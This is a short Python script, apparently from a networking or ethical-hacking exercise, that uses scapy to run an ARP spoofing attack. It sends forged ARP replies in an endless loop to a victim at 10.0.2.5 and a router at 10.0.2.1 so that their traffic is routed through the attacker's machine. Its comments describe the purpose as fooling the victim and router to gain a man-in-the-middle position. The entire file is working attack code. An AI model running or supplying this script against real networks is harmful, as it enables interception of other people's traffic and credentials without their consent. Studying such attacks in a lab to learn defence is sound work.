#! /usr/bin/python3

#scapy lets us probe, scan or attack networks.
import scapy.all as scapy
#time allow us to make our code wait an amount of time
import time


#Function that return the MAC address of an IP 
def get_mac(ip):
    #this send an ARP request to the ip range provided
    arp_request = scapy.ARP(pdst = ip)
    #stored in broadcast, this make sure to send the broadcast MAC adress
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    #make a packet of a request combining both ARP request and Broadcast
    arp_request_broadcast = broadcast/arp_request
    #stored the reponse of the ARP request, ans store the packets answered and unans store the packets unanswered
    ans_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    #return the MAC address of the IP specified
    return ans_list[0][1].hwsrc

#Function that send packets to the router and the victims pc and fool them to make a MiTM(Man in the Middle)
def spoof(target_ip, spoof_ip):
    #We call the gec mac function with the information of the MAc address of the ip spicified
    target_mac = get_mac(target_ip)
    #This packet fool the target computer to let them think we are the router
    packet = scapy.ARP(op=2, pdst= target_ip, hwdst= target_mac, psrc= spoof_ip)
    #Send the packet to the target
    scapy.send(packet, verbose= False)

#Variable that count the number of packets sent
packets_count = 0
#managing error outputs
try:
    #This loops keep sending packets to both the victim and the router
    while True:
        #Send packet to the victim to let them think im the router
        spoof('10.0.2.5','10.0.2.1')
        #Send packet to the router to let them think im th victim
        spoof('10.0.2.1','10.0.2.5')
        #Update the packet counter value
        packets_count = packets_count + 2
        #Print a message to tell the user the number of packets sent and stored in a buffer
        print( "\r[+] Packets sent: " + str(packets_count), end="")
        #Make the code wait 2 second to send packets again
        time.sleep(2)
except KeyboardInterrupt:
    #printing information when pressing CONTROL C
    print("[+] Quitting...")